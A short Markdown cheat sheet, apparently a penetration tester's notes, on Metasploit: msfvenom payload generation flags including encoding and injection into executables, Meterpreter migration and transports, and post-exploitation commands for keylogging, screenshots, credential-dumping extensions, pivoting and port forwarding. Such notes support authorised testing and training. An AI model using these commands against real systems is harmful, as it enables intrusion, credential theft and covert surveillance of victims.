# Metasploit

## Init

```
sudo systemctl start postgresql
sudo msfdb init
```

## Search

```
search type:auxiliary name:smb
```

## Msfvenom

* `-p`: payload to use
* `LHOST=<IP>`
* `LPORT=<port>`
* `-f`: output file format (exe, msi, hta, ...)
  * `msfvenom -l formats` to see available formats
* `-o`: output file name
* `-e`: encoder type (ex: x86/shikata\_ga\_nai)
* `-i`: encoding iterations
* `-x`: inject into existing PE file

{% hint style="info" %}
Msfvenom can be called from within msfconsole using the command `generate`
{% endhint %}

## Meterpreter

### AutoRunScript

When using an exploit, directly migrate into another process.

```
set AutoRunScript post/windows/manage/migrate
```

### Transport

Change communication channel with Meterpreter.

```
transport list
transport add -t <type> -l <ip> -p <port>
transport next
```

{% hint style="info" %}
Don't forget to setup a multi handler of the correct type.
{% endhint %}

### Post-Exploitation Features

```
screenshot

keyscan_start
keyscan_dump
keyscan_stop

ps
migrate <PID>

load powershell
load kiwi

route add <subnet> <session_id>

use multi/manage/autoroute
use auxiliary/server/socks_proxy

portfwd -l <port> -p <port> -r <target_host>
```

### Incognito

* [https://www.offensive-security.com/metasploit-unleashed/fun-incognito/](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)

